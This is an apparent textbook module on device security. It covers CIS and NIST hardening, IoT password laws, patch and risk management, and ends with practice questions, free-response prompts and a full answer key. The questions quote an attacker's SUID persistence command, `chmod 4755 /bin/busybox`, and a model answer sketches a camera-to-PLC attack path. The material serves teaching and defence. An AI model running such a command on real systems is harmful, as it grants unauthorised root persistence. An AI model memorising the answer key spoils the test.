+<h4>2. NIST and CIS Baseline Hardening</h4>
+<p>The <span class="annot">CIS Benchmarks<span class="tip"><strong>CIS Benchmarks</strong>A set of freely available, consensus-developed configuration guidelines published by the Center for Internet Security, covering hundreds of operating systems, applications, and device types. Each benchmark provides specific, testable settings (e.g., "disable SMBv1," "set minimum password length to 14") that harden a default installation against common attacks. <em>CIS Benchmarks map directly to the CIS Critical Security Controls and are frequently referenced as an implementation standard alongside NIST SP 800-53.</em></span></span> published by the Center for Internet Security provide device- and OS-specific hardening checklists that organizations apply as a baseline configuration standard prior to deployment. Combined with NIST SP 800-53's CM (Configuration Management) and SI (System and Information Integrity) control families, these frameworks formalize the process of reducing attack surface as a repeatable, auditable procedure rather than an ad hoc decision left to individual administrators.</p>
+
+<h4>3. IoT-Specific Regulatory Controls</h4>
+<p>Recognizing that manufacturers, not end users, control the security posture at the point of manufacture, regulators have begun mandating security-by-design requirements. California's SB-327 (effective 2020) and the U.K.'s Product Security and Telecommunications Infrastructure Act require that IoT devices sold in those jurisdictions either use unique per-device default passwords or force a password change during initial setup, directly targeting the root cause exploited by Mirai.</p>
+
+<div class="prof-note connection">
+  <span class="prof-note-label">Legislating the shared factory password out of existence</span>
+  California SB-327, in force since 1 January 2020, is generally described as the first IoT-specific security statute in the United States. Its operative requirement is narrow and precisely aimed: a connected device sold in the state must either carry a preprogrammed password unique to that unit, or force the user to generate a new means of authentication before the device is granted access for the first time. Set that against Mirai's <code>scanner.c</code> table and the fit is exact, a unique-per-unit password makes a shared credential list worthless, and a forced first-use change makes the shipped password irrelevant. It is worth noticing what the statute does <em>not</em> reach: firmware update commitments, published support lifetimes, and the open Telnet service that made the credential reachable at all. A law of this kind removes one defect class; it does not harden a device.
+</div>
+
+<h4>4. Patch and Vulnerability Management</h4>
+<p>Because WannaCry demonstrates that a released patch is only effective if deployed, organizations must maintain a formal patch management cadence, prioritized using the <span class="annot">Common Vulnerability Scoring System (CVSS)<span class="tip"><strong>CVSS, Common Vulnerability Scoring System</strong>An industry-standard numeric scale (0.0–10.0) for rating the severity of a security vulnerability, based on factors like how easily it can be exploited, whether authentication is required, and the potential impact. A CVSS score of 9.0+ ("Critical") signals a vulnerability that should be patched immediately, often within 24–72 hours per organizational policy. <em>Maintained by FIRST.org. EternalBlue's underlying vulnerability, CVE-2017-0144, carries a CVSS v2 base score of 9.3.</em></span></span> to determine patch urgency, and validated through automated vulnerability scanning (e.g., Nessus, Qualys) rather than relying on manual tracking spreadsheets.</p>
+
+<div class="prof-note exam-focus">
+  <span class="prof-note-label">Preventive, detective, and corrective controls answer different questions</span>
+  Controls are conventionally sorted by <em>when</em> they act relative to an incident, and the three classes are not substitutes for one another. <strong>Preventive</strong> controls act before: disable the service nobody uses, replace the factory credential, apply the patch, remove local administrator rights. <strong>Detective</strong> controls act during: log authentication failures and privilege changes, forward them off the host, alert on the correlated pattern rather than the single event. <strong>Corrective</strong> controls act after: isolate the host, rotate every credential that was resident on it, rebuild from a known-good image, restore data from a backup the malware could not reach. A programme strong in only one class fails in a characteristic way. All-preventive means the first successful intrusion runs undisturbed for months. All-detective means the organisation narrates its own breach in real time. All-corrective means it has become very good at recovering from an incident it keeps having.
+</div>
+
+<h4>5. Assessing and Documenting Device Risk</h4>
+
+<p>Identifying a vulnerability is not yet risk management. An organisation with three hundred findings and a budget for thirty needs a defensible ordering, and the ordering has to survive being questioned by someone who was not in the room. This is what a risk assessment produces: a written record in which every finding carries an estimate of how likely it is to be exploited, an estimate of what it would cost if it were, a resulting priority, a named owner, and a decision.</p>
+
+<p>The scoring inputs come from two different places and should not be confused. <strong>CVSS</strong> describes the vulnerability in isolation, its base score answers how hard it is to exploit and how much damage the exploit does to the affected component, with no knowledge of your environment. It is a severity score, not a risk score. Converting it into risk requires the two things CVSS deliberately omits: exposure (is the vulnerable service reachable from the internet, from the office network, or from nowhere?) and asset value (does this device run the payroll database or the break-room television?). A CVSS 9.8 on an isolated laboratory host may rank below a CVSS 6.5 on an internet-facing appliance that fronts customer data, and a risk register that cannot express that will send the remediation team to the wrong place. The current authoritative supplement is CISA's <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener">Known Exploited Vulnerabilities catalog</a>, which records the vulnerabilities for which exploitation has actually been observed, a far better predictor of likelihood than severity alone, since only a small minority of published CVEs are ever exploited in the wild.</p>
+
+<figure class="chapter-image">
+<svg viewBox="0 0 700 380" xmlns="http://www.w3.org/2000/svg" role="img" width="100%"
+     aria-label="A five-by-five risk matrix with likelihood on the horizontal axis from rare to almost certain and impact on the vertical axis from negligible to severe. Cells are shaded from low in the bottom left through moderate in the diagonal band to high and critical in the top right. Four findings from a sample device fleet are plotted. Finding one, an internet-facing camera with the factory Telnet password, sits at almost certain likelihood and major impact in the critical zone. Finding two, an unpatched SMB service on an internal file server, sits at likely and severe, also critical. Finding three, an end-of-life imaging workstation on a segmented clinical VLAN, sits at unlikely and severe, in the high zone. Finding four, an outdated firmware version on a conference-room display, sits at possible and negligible, in the low zone.">
+  <rect x="0" y="0" width="700" height="380" fill="#f7f8fa"/>
+  <text x="20" y="26" font-family="Georgia, serif" font-size="15" font-weight="bold" fill="#1a1a1a">Figure 4.1.1 &#183; Plotting four device findings on a likelihood-by-impact matrix</text>
+
+  <g font-family="Georgia, serif" font-size="11" fill="#444">
+    <text x="20" y="200" transform="rotate(-90 20 200)" text-anchor="middle">Impact &#8594;</text>
+    <text x="350" y="368" text-anchor="middle">Likelihood of exploitation &#8594;</text>
+  </g>
+
+  <!-- grid: 5x5 starting at x=120 y=50, cell 88x54 -->
+  <g stroke="#ffffff" stroke-width="2">
+    <rect x="120" y="50"  width="88" height="54" fill="#f0c33c"/><rect x="208" y="50"  width="88" height="54" fill="#e8963c"/><rect x="296" y="50"  width="88" height="54" fill="#d4553a"/><rect x="384" y="50"  width="88" height="54" fill="#b3261e"/><rect x="472" y="50"  width="88" height="54" fill="#b3261e"/>
+    <rect x="120" y="104" width="88" height="54" fill="#e4dc78"/><rect x="208" y="104" width="88" height="54" fill="#f0c33c"/><rect x="296" y="104" width="88" height="54" fill="#e8963c"/><rect x="384" y="104" width="88" height="54" fill="#d4553a"/><rect x="472" y="104" width="88" height="54" fill="#b3261e"/>
+    <rect x="120" y="158" width="88" height="54" fill="#cfe0a8"/><rect x="208" y="158" width="88" height="54" fill="#e4dc78"/><rect x="296" y="158" width="88" height="54" fill="#f0c33c"/><rect x="384" y="158" width="88" height="54" fill="#e8963c"/><rect x="472" y="158" width="88" height="54" fill="#d4553a"/>
+    <rect x="120" y="212" width="88" height="54" fill="#b8d492"/><rect x="208" y="212" width="88" height="54" fill="#cfe0a8"/><rect x="296" y="212" width="88" height="54" fill="#e4dc78"/><rect x="384" y="212" width="88" height="54" fill="#f0c33c"/><rect x="472" y="212" width="88" height="54" fill="#e8963c"/>
+    <rect x="120" y="266" width="88" height="54" fill="#b8d492"/><rect x="208" y="266" width="88" height="54" fill="#b8d492"/><rect x="296" y="266" width="88" height="54" fill="#cfe0a8"/><rect x="384" y="266" width="88" height="54" fill="#e4dc78"/><rect x="472" y="266" width="88" height="54" fill="#f0c33c"/>
+  </g>
+
+  <g font-family="Georgia, serif" font-size="11" fill="#333" text-anchor="end">
+    <text x="112" y="82">Severe</text>
+    <text x="112" y="136">Major</text>
+    <text x="112" y="190">Moderate</text>
+    <text x="112" y="244">Minor</text>
+    <text x="112" y="298">Negligible</text>
+  </g>
+  <g font-family="Georgia, serif" font-size="11" fill="#333" text-anchor="middle">
+    <text x="164" y="338">Rare</text>
+    <text x="252" y="338">Unlikely</text>
+    <text x="340" y="338">Possible</text>
+    <text x="428" y="338">Likely</text>
+    <text x="516" y="338">Almost certain</text>
+  </g>
+
+  <!-- plotted findings -->
+  <g font-family="Georgia, serif" font-size="12" font-weight="bold">
+    <circle cx="516" cy="77"  r="14" fill="#1a1a1a"/><text x="516" y="82"  fill="#fff" text-anchor="middle">1</text>
+    <circle cx="428" cy="77"  r="14" fill="#1a1a1a"/><text x="428" y="82"  fill="#fff" text-anchor="middle">2</text>
+    <circle cx="252" cy="77"  r="14" fill="#1a1a1a"/><text x="252" y="82"  fill="#fff" text-anchor="middle">3</text>
+    <circle cx="340" cy="293" r="14" fill="#1a1a1a"/><text x="340" y="298" fill="#fff" text-anchor="middle">4</text>
+  </g>
+
+  <g font-family="Georgia, serif" font-size="11" fill="#333">
+    <text x="574" y="60">1 &#183; Internet-facing camera,</text>
+    <text x="574" y="74">factory Telnet password</text>
+    <text x="574" y="100">2 &#183; Unpatched SMB on</text>
+    <text x="574" y="114">internal file server</text>
+    <text x="574" y="140">3 &#183; End-of-life imaging</text>
+    <text x="574" y="154">workstation, segmented</text>
+    <text x="574" y="180">4 &#183; Stale firmware on</text>
+    <text x="574" y="194">conference display</text>
+  </g>
+</svg>
+  <figcaption><strong>Figure 4.1.1</strong>, Findings 1 and 2 carry comparable CVSS severity, but finding 1 outranks it on likelihood because the service is internet-reachable and the credential requires no exploit at all. Finding 3 shares finding 2's severity and cannot be patched, yet its segmentation moves it two columns left, which is exactly the claim the compensating control has to keep being true. Finding 4 is a real vulnerability that should be scheduled, not escalated.</figcaption>
+</figure>
+
+<p>The register that accompanies the matrix is the durable artefact. A workable minimum for each finding is: an identifier; the affected asset and its owner; the vulnerability, with a CVE reference where one exists; the CVSS base score; the observed exposure; the assessed likelihood and impact with a sentence of justification for each; the resulting risk rating; the chosen treatment; and a date. The four available treatments are worth naming, because "we are working on it" is not one of them. <em>Mitigate</em>, apply a control that reduces likelihood or impact. <em>Transfer</em>, move the financial consequence elsewhere, typically by insurance or contract. <em>Avoid</em>, stop doing the thing that creates the exposure, by decommissioning the device or removing the service. <em>Accept</em>, decide the risk is tolerable, and record who decided. Acceptance is a legitimate outcome and the one most often taken informally by default; the discipline the register enforces is that acceptance must be signed by someone with the authority to absorb the loss, rather than arrived at by nobody making a decision.</p>
+
+
+      </section>
+
+      <section class="textbook-section" id="sec-bibliography">
+        <h3>V. References and Further Reading</h3>
+        <ol class='bibliography-list' style='padding-left: 20px; font-size: 15px; color: var(--text-muted);'><li style='margin-bottom: 12px; text-align: justify;'>Cohen, F. (1987). Computer viruses: Theory and experiments. Computers &amp; Security, 6(1), 22–35.</li><li style='margin-bottom: 12px; text-align: justify;'>NIST Special Publication 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops (2013).</li><li style='margin-bottom: 12px; text-align: justify;'>NISTIR 8228: Considerations for Managing Internet of Things (IoT) Cybersecurity and Privacy Risks (2019).</li><li style='margin-bottom: 12px; text-align: justify;'>Antonakakis, M. et al. (2017). Understanding the Mirai Botnet. Proceedings of the 26th USENIX Security Symposium.</li><li style='margin-bottom: 12px; text-align: justify;'>Microsoft Security Response Center. (2017). Customer Guidance for WannaCrypt Attacks (MS17-010).</li><li style='margin-bottom: 12px; text-align: justify;'>Center for Internet Security. CIS Critical Security Controls, Version 8 (2021).</li><li style='margin-bottom: 12px; text-align: justify;'>NIST Special Publication 800-193: Platform Firmware Resiliency Guidelines (2018). <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-193.pdf" target="_blank" rel="noopener">nvlpubs.nist.gov</a></li><li style='margin-bottom: 12px; text-align: justify;'>NIST Special Publication 800-30 Rev. 1: Guide for Conducting Risk Assessments (2012). <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-30r1.pdf" target="_blank" rel="noopener">nvlpubs.nist.gov</a></li><li style='margin-bottom: 12px; text-align: justify;'>Cybersecurity and Infrastructure Security Agency. Known Exploited Vulnerabilities Catalog. <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener">cisa.gov</a></li><li style='margin-bottom: 12px; text-align: justify;'>ESET Research. (2018). LoJax: First UEFI rootkit found in the wild, courtesy of the Sednit group.</li><li style='margin-bottom: 12px; text-align: justify;'>National Vulnerability Database entry for CVE-2017-0144. <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144" target="_blank" rel="noopener">nvd.nist.gov</a></li></ol>
+      </section>
+    </div>
+  </article>
+
+  <section class="review-questions">
+    <h3>Self-Check Review Questions</h3>
+    <div class="question-block">
+      <div class="question-header">Question 1: Distinguish between a virus, a worm, and a trojan based on their infection and propagation mechanisms, and explain why WannaCry is correctly described using more than one classification.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(1)">Toggle Answer</button>
+      <div class="solution-content" id="sol-1">
+        <p>A virus requires a host file and human execution to activate; it cannot spread on its own and depends on a user opening an infected document or program. A worm is self-propagating and network-aware, autonomously scanning for and exploiting vulnerable services without any user interaction. A trojan disguises itself as legitimate software and relies entirely on social engineering to convince a user to execute it once; it does not self-replicate.
+
+WannaCry is correctly classified as both a worm and ransomware because these labels describe two independent dimensions of its behavior: its propagation mechanism and its payload objective. It propagated as a worm, using the EternalBlue exploit against the SMBv1 protocol to spread automatically across networks with no user interaction required. Its objective, once resident on a machine, was that of ransomware, encrypting victim files using AES and RSA and demanding cryptocurrency payment for the decryption key. Because these classifications describe different aspects of the malware (how it spreads vs. what it does), a single sample can and should be labeled with both.</p>
+      </div>
+    </div>
+    <div class="question-block">
+      <div class="question-header">Question 2: Explain how default administrator credentials on IoT devices enabled the Mirai botnet to compromise devices at massive scale, and identify the control that most directly addresses this root cause.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(2)">Toggle Answer</button>
+      <div class="solution-content" id="sol-2">
+        <p>Mirai's scanning engine continuously probed random internet IP ranges for devices with an open Telnet port (TCP 23) and attempted authentication using a hardcoded list of 61 common factory-default username/password pairs shipped by IoT manufacturers. Because a large population of IoT devices were never individually reconfigured by their owners after purchase, these default credentials remained valid indefinitely across hundreds of thousands of units simultaneously, allowing a single automated scanning script to compromise devices at internet scale without any targeted reconnaissance.
+
+The control that most directly addresses this root cause is the elimination of shared, universal default credentials, either through mandatory unique per-device passwords set at the factory (as required by regulations such as California's SB-327) or a forced password-change workflow during initial device setup. Disabling unnecessary services such as Telnet in favor of encrypted alternatives (e.g., SSH) further reduces the exposed attack surface even if credential hygiene is imperfect.</p>
+      </div>
+    </div>
+    <div class="question-block">
+      <div class="question-header">Question 3: Describe the technique of privilege escalation and explain, using the SUID bit example from the authentication log analyzed in Section II, how an attacker converts an initial low-privilege foothold into persistent administrative control.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(3)">Toggle Answer</button>
+      <div class="solution-content" id="sol-3">
+        <p>Privilege escalation is the deliberate exploitation of a flaw, misconfiguration, or design weakness to convert an initial low-privilege access foothold into higher-level (typically administrative or root) access rights. Because operating systems apply the principle of least privilege by default, an attacker who gains access to a standard, non-privileged account cannot immediately perform system-wide actions such as installing persistent malware or disabling security tooling; they must first escalate privileges.
+
+In the analyzed log, the attacker authenticated as the low-privilege "admin" account via a successful brute-force logon, then immediately issued a sudo command to set the SUID (Set User ID) bit on the /bin/busybox binary using chmod 4755. Because the SUID bit causes a program to execute with the privileges of its file owner (root) rather than the invoking user, this action grants the attacker a persistent mechanism to regain root-equivalent execution at any future point simply by invoking that binary, even if their original account's credentials are later changed or its access is revoked. This is a classic privilege-escalation persistence technique on embedded Linux systems, and it is precisely the kind of command sequence (sudo invocation modifying a SUID bit) that endpoint detection systems and log-review analysts are trained to flag as high-severity indicators of compromise.</p>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="review-questions">
+    <h3>Practice Questions</h3>
+
+    <div class="question-block">
+      <div class="question-header">Question 1 <span class="ap-code">4.1.B</span>, An incident report describes a program that arrived as an attachment named <code>invoice_scan.pdf.exe</code>, was opened by an employee, did not copy itself to any other machine, and installed a driver that removed its own files from directory listings. Which combination of classifications best describes it?</div>
+      <ol type="A">
+        <li>A worm with a rootkit payload.</li>
+        <li>A trojan with rootkit persistence.</li>
+        <li>A virus with ransomware persistence.</li>
+        <li>A rootkit that propagated as a virus.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 2 <span class="ap-code">4.1.C</span>, A building-automation controller runs an operating system whose vendor announced end-of-life four years ago. A newly published vulnerability affects it, and the vendor has confirmed that no patch will be issued. Which response most accurately reflects the situation?</div>
+      <ol type="A">
+        <li>Add the finding to the patch backlog and schedule it in the next maintenance window.</li>
+        <li>Record the finding as low risk, since no patch exists and therefore nothing can be done.</li>
+        <li>Treat the vulnerability as permanent and either replace the controller or apply compensating controls that remove the adversary's access to it.</li>
+        <li>Install an endpoint detection agent on the controller so the exploit is caught at runtime.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 3 <span class="ap-code">4.1.D</span>, Two findings on a hospital network carry identical CVSS base scores of 9.8. Finding X affects a patient-portal server reachable from the internet; finding Y affects a laboratory instrument on a VLAN with no route off the segment and no inbound path from user networks. What does the equality of the CVSS scores tell the risk assessor?</div>
+      <ol type="A">
+        <li>The two findings carry equal risk and should be remediated in the same window.</li>
+        <li>The two vulnerabilities are equally severe in isolation; risk still differs because exposure and asset value are inputs CVSS does not include.</li>
+        <li>CVSS is unreliable and should be replaced with an internally invented scale.</li>
+        <li>Finding Y is more urgent, because instruments cannot be patched as easily as servers.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 4 <span class="ap-code">4.1.A</span>, A security team proposes deploying the same endpoint detection and response agent to every device in the organisation. On which class of device is this proposal least likely to be achievable, and why?</div>
+      <ol type="A">
+        <li>Laptops, because full-disk encryption conflicts with agent installation.</li>
+        <li>Servers, because the agent would consume capacity needed by shared services.</li>
+        <li>Embedded and operational-technology devices, because they lack the compute, storage, and vendor-supported software installation path an agent requires.</li>
+        <li>Mobile devices, because their operating systems have no security features of their own.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 5 <span class="ap-code">4.1.C</span>, In the authentication log analysed in Section II, the attacker's first action after a successful logon was <code>chmod 4755 /bin/busybox</code>. What did this accomplish?</div>
+      <ol type="A">
+        <li>It encrypted the binary so that endpoint scanners could not read it.</li>
+        <li>It set the SUID bit, so that any later execution of the binary runs with the privileges of its owner rather than of the invoking user, a persistent route back to root.</li>
+        <li>It removed the binary's execute permission, disabling the device's recovery shell.</li>
+        <li>It changed the file's owner to the attacker's account, transferring control of the binary.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 6 <span class="ap-code">4.1.B</span>, A malware sample spreads between hosts by exploiting a network file-sharing service with no user interaction, and on each host it encrypts documents and displays a payment demand. Which description is most complete?</div>
+      <ol type="A">
+        <li>Ransomware; the network spreading is an implementation detail of the same category.</li>
+        <li>A worm; encryption is simply the destructive effect worms typically have.</li>
+        <li>A worm in propagation and ransomware in payload, both must be named, because propagation drives containment and payload drives recovery.</li>
+        <li>A virus, because it modifies files on each host it reaches.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Free Response 1 <span class="ap-code">4.1.C</span> <span class="ap-skill">Analyze Risk</span>, A regional water utility operates 240 remote pumping stations. Each station contains a programmable logic controller that regulates pump speed, a cellular router providing connectivity back to the control centre, and an IP camera. All 240 cameras are the same model from a single vendor, were installed in one procurement, and still carry the factory administrator password; the vendor declared the model end-of-life two years ago. (a) Identify the vulnerability precisely, and explain why the fleet's homogeneity changes its severity rather than merely its count. (b) Describe a plausible attack path from the camera to a consequence involving loss, damage, disruption, or destruction, naming each step. (c) The utility cannot replace all 240 cameras this fiscal year. Propose two compensating controls, explain the mechanism by which each reduces risk, and state what has to remain true for each control to keep working.</div>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Free Response 2 <span class="ap-code">4.1.D</span> <span class="ap-skill">Analyze Risk</span>, You are asked to document the findings from the utility in Free Response 1 for a manager who will decide what to fund. (a) List the fields your risk register entry will contain and state, in one clause each, why that field is needed by someone who was not present at the assessment. (b) Assign a likelihood and an impact to the camera finding, and justify each with reference to specific evidence rather than intuition. (c) The manager proposes accepting the risk until the next budget cycle. Explain what a defensible acceptance requires, and describe one condition under which acceptance would <em>not</em> be defensible.</div>
+    </div>
+  </section>
+
+  <section class="answer-key">
+    <h3>Answer Key</h3>
+
+    <div class="key-item">
+      <span class="key-q">1. B</span><span class="key-lo">4.1.B</span>
+      <p class="key-why">The double extension and the user-initiated execution identify a trojan: the code depended entirely on a person believing it was a document. The driver that hides the sample's own files from directory listings is rootkit behaviour, which is a persistence and concealment property rather than a propagation one. <strong>A</strong> fails on the explicit statement that the program did not copy itself to other machines, which is the defining behaviour of a worm. <strong>C</strong> misuses both terms: a virus attaches to and infects a host file, which is not described here, and nothing was encrypted or ransomed. <strong>D</strong> inverts the axes, a rootkit is a payload category and has no propagation mechanism of its own.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">2. C</span><span class="key-lo">4.1.C</span>
+      <p class="key-why">End-of-life means the supplier has stopped issuing fixes, so the vulnerability is a permanent property of every deployed unit. The two real options are removal (replace or decommission) and compensating controls that make the vulnerability unreachable. <strong>A</strong> treats the finding as a scheduling problem when there is nothing to schedule; the backlog entry will never close. <strong>B</strong> confuses the absence of a remedy with the absence of risk, which is the reverse of the truth, an unpatchable vulnerability is more dangerous than a patchable one, not less. <strong>D</strong> proposes a control the device class cannot support: building controllers have neither the compute nor a vendor-supported installation path for an endpoint agent, and installing unsupported software on a controller may itself void safety certification.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">3. B</span><span class="key-lo">4.1.D</span>
+      <p class="key-why">A CVSS base score characterises the vulnerability in isolation: exploitation difficulty and impact on the affected component. It deliberately excludes environmental facts. Reachability and asset value are supplied by the assessor, and here they diverge sharply, so the internet-facing finding outranks the isolated one despite identical scores. <strong>A</strong> treats severity as though it were risk, the single most common error in vulnerability triage. <strong>C</strong> overcorrects: CVSS is doing exactly what it was designed to do, and discarding a standard scale in favour of a private one loses comparability with the rest of the industry. <strong>D</strong> confuses difficulty of remediation with urgency of remediation; a hard-to-fix finding may still be low risk if nothing can reach it.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">4. C</span><span class="key-lo">4.1.A</span>
+      <p class="key-why">Embedded and operational-technology devices are defined by constrained compute and storage and by a closed software supply, so there is frequently no supported way to install third-party code at all. This is why defence for that class relocates to the surrounding network. <strong>A</strong> is false; disk encryption and endpoint agents coexist routinely. <strong>B</strong> describes a capacity-planning consideration, not an impossibility, and servers are among the most heavily instrumented assets in most organisations. <strong>D</strong> misstates the mobile case: mobile operating systems have substantial built-in protections, and the obstacle to a conventional agent is precisely that sandboxing prevents one application from observing another, a security property, not its absence.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">5. B</span><span class="key-lo">4.1.C</span>
+      <p class="key-why">The leading 4 in the mode <code>4755</code> sets the set-user-ID bit; the remaining <code>755</code> gives owner read/write/execute and everyone else read/execute. A SUID binary owned by root executes with root's effective privileges no matter who launches it, so the attacker retains a route to root even if the compromised account's password is later changed. <strong>A</strong> is wrong on the mechanics: <code>chmod</code> alters permission metadata and never touches file contents. <strong>C</strong> reverses the effect, since <code>755</code> grants execute permission rather than removing it. <strong>D</strong> confuses <code>chmod</code> with <code>chown</code>; ownership is unchanged, and in fact the attack depends on ownership remaining root.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">6. C</span><span class="key-lo">4.1.B</span>
+      <p class="key-why">Propagation and payload are independent axes, and this sample is described on both: autonomous exploitation of a network service (worm) and encryption with an extortion demand (ransomware). Naming both changes the response, because containment follows from propagation and recovery follows from payload. <strong>A</strong> discards the propagation fact, and a team that does so will restore a host onto a network where the worm immediately reinfects it. <strong>B</strong> misattributes the encryption to the worm category; worms have no characteristic payload, and many carry none. <strong>D</strong> misapplies "virus", which requires attachment to a host file and human execution, neither occurs here.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">FR 1</span><span class="key-lo">4.1.C</span>
+      <p class="key-why"><strong>Model answer.</strong> (a) The vulnerability is a shared, unchanged factory administrator credential on a network-reachable management interface, on hardware whose vendor has ceased issuing firmware fixes. Homogeneity changes severity rather than count because a single working credential is valid against all 240 units simultaneously: the adversary's cost to compromise the whole fleet is essentially the cost of compromising one, so the correct unit of assessment is the fleet, not the device. The end-of-life status compounds this by removing patching from the response set permanently. (b) A plausible chain: internet-wide scanning identifies the camera model by its service banner; the factory credential authenticates without any exploit; the attacker obtains a shell on the camera and uses it as a foothold inside the station's local network, which is the side of the cellular router the perimeter does not protect; from there the attacker reaches the programmable logic controller, which in most deployments of this kind neither authenticates nor encrypts its control protocol; commands issued to the controller alter pump behaviour. Consequences span the framework's four categories, disruption of supply, physical damage to pumps from pressure transients, destruction of the controller configuration, and loss of the operational data the station reports. (c) Two controls with distinct mechanisms. <em>Segmentation:</em> place the cameras on an isolated VLAN with an explicit deny between that VLAN and the controller network and no inbound path from the internet, which removes the adversary's reachability rather than the vulnerability; it holds only while the access-control list is enforced and no future change, temporary rule, or dual-homed maintenance laptop bridges the two segments. <em>Credential and interface reduction:</em> change every camera's password to a unique value and disable Telnet and any unnecessary management service, which removes the specific credential the fleet shares; it holds only while no factory reset restores the shipped configuration and no maintenance procedure reintroduces a common password. Egress filtering that blocks the cameras from initiating outbound connections is an acceptable third answer. <br><strong>Look for:</strong> the vulnerability stated as a property of the system rather than as "hackers"; an explicit argument that homogeneity concentrates rather than aggregates risk; a chain in part (b) with named, ordered steps ending in a consequence drawn from loss, damage, disruption, or destruction; and, in part (c), a stated mechanism plus a stated standing assumption for each control. A response that offers "install antivirus on the cameras" without noting that the device class cannot support it should not receive credit for that control.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">FR 2</span><span class="key-lo">4.1.D</span>
+      <p class="key-why"><strong>Model answer.</strong> (a) A workable register entry carries: a finding identifier, so the item can be referenced in later correspondence; the affected asset and its owner, so there is a named person accountable for the decision; the vulnerability description with a CVE reference where one exists, so the claim can be independently verified; the CVSS base score, to give a standard severity anchor comparable across findings; the observed exposure, because reachability is what converts severity into risk and is not in the score; assessed likelihood and impact each with a written justification, so a reader can audit the reasoning rather than the conclusion; the resulting risk rating, to place the finding in the queue; the chosen treatment from mitigate, transfer, avoid, or accept; the responsible owner and target date; and the date of assessment, because every one of these judgements has a shelf life. (b) Likelihood is <em>almost certain</em>: the credential is publicly documented in the product manual, the management interface is reachable, no exploit development is required, and mass scanning for this device class is continuous and well documented, Mirai's operating model is direct evidence that this exact configuration is found and used at scale. Impact is <em>major</em> to <em>severe</em>: the camera itself is low-value, but the assessed impact must follow the attack path, and the path terminates at process control equipment where consequences are physical. Justifying impact by the value of the compromised device alone is the characteristic error here. (c) A defensible acceptance requires that the risk be recorded at its assessed rating and not quietly downgraded; that the accepting party hold authority commensurate with the potential loss, which for physical consequences to a public utility is unlikely to sit with a line manager; that the acceptance carry an explicit expiry date and a review trigger; and that any compensating controls the acceptance depends on be named, in place, and verified rather than assumed. Acceptance would not be defensible where the residual risk includes a safety consequence to the public, where a regulator or contract mandates remediation regardless of the organisation's own appetite, or where evidence of active exploitation appears, for instance the vulnerability being added to the CISA Known Exploited Vulnerabilities catalog, which changes the likelihood input and therefore invalidates the assessment the acceptance was based on. <br><strong>Look for:</strong> fields justified by what a downstream reader needs, not merely listed; likelihood and impact each tied to named evidence; impact reasoned along the attack path rather than from the compromised device's own value; and, in part (c), acceptance treated as an authorised, dated, and revisitable decision rather than as a synonym for inaction.</p>
+    </div>
+  </section>
+
+  <footer class="footnote-block">
+    <p>This reading module serves as an advanced academic and research reference. All cited works, specifications, and guidance frameworks are credited in the bibliography section above.</p>
+  </footer>
+</div>
+
+<nav class="topic-pager"><a class="prev disabled" href="#"><span class="pager-label">Previous</span>&larr; none</a><a class="next" href="../4.2/notes.html"><span class="pager-label">Next</span>4.2 Device Authentication Hardening &rarr;</a></nav>
+
+
+<aside class="notes-sidebar collapsed" id="notesSidebar">
+  <button class="notes-sidebar-tab" id="notesSidebarTab">Notes</button>
+  <div class="notes-sidebar-header">
+    <h4>Notes</h4>
+    <button class="notes-sidebar-close" id="notesSidebarClose">&times;</button>
+  </div>
+  <div class="notes-sidebar-body">
+    <h5>Professor's Notes</h5>
+    <div id="sideProfNoteList"></div>
+    <h5>Your Highlights</h5>
+    <p style="font-size:11px;color:var(--text-muted);margin:0 0 10px 0;">Select any text in the chapter to highlight it.</p>
+    <div class="side-highlight-list" id="sideHighlightList"></div>
+    <h5>Your Notes</h5>
+    <textarea id="userNotesInput" placeholder="Write your own notes on this page here..."></textarea>
+    <div class="notes-save-status" id="notesSaveStatus"></div>
+  </div>
+</aside>
+
+<script src="../../assets/notes/reader.js"></script>
+<script src="../../assets/notes/sidebar-notes.js"></script>
+</body>
+</html>
